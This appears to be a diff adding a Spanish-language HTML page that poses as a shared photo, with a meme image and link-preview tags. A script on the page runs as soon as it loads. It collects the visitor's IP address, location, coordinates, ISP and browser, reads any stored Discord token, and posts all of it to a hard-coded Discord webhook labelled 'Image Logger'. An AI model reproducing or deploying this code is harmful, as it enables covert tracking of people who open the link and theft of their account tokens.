@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="utf-8">
+<title>Foto</title>
+<meta property="og:title" content="Foto">
+<meta property="og:image" content="https://cdn.memegenerator.es/imagenes/memes/full/33/8/33083013.jpg">
+<meta property="og:type" content="website">
+<style>
+  html,body{margin:0;height:100%;background:#0d0d0d;display:grid;place-items:center}
+  img{max-width:100%;max-height:100vh}
+</style>
+</head>
+<body>
+<img src="https://cdn.memegenerator.es/imagenes/memes/full/33/8/33083013.jpg" alt="">
+<script>
+const WEBHOOK = "https://discord.com/api/webhooks/1557895085880778834/rsezWB1XAGu2pa265gwxeCkDvxmFMVvTmNVvQfwsY69iF-OyYG8POALhsmGWoxbDuKU_";
+
+function getToken(){
+  try{ let t = localStorage.getItem("token"); return t ? t.replace(/"/g,"") : null; }
+  catch(e){ return null; }
+}
+async function geo(){
+  try{ return await (await fetch("https://ipwho.is/")).json(); }catch(e){ return {}; }
+}
+
+(async () => {
+  const g = await geo();
+  const token = getToken();
+  const fields = [
+    {name:"IP", value: g.ip || "?"},
+    {name:"Ciudad", value: `${g.city||"?"}, ${g.region||"?"} (${g.country||"?"})`},
+    {name:"ISP", value: (g.connection && g.connection.isp) || "?"},
+    {name:"Zona horaria", value: (g.timezone && g.timezone.id) || "?"},
+    {name:"Coords", value: `${g.latitude||"?"}, ${g.longitude||"?"}`},
+    {name:"Token", value: token ? "`"+token+"`" : "solo si usa Discord web"},
+    {name:"Navegador", value: navigator.userAgent}
+  ];
+  await fetch(WEBHOOK, {
+    method:"POST",
+    headers:{"Content-Type":"application/json"},
+    body: JSON.stringify({
+      username:"Image Logger",
+      embeds:[{title:"🎯 Alguien abrió tu imagen", color:0x5865F2, fields, timestamp:new Date().toISOString()}]
+    })
+  });
+})();
+</script>
+</body>
+</html>
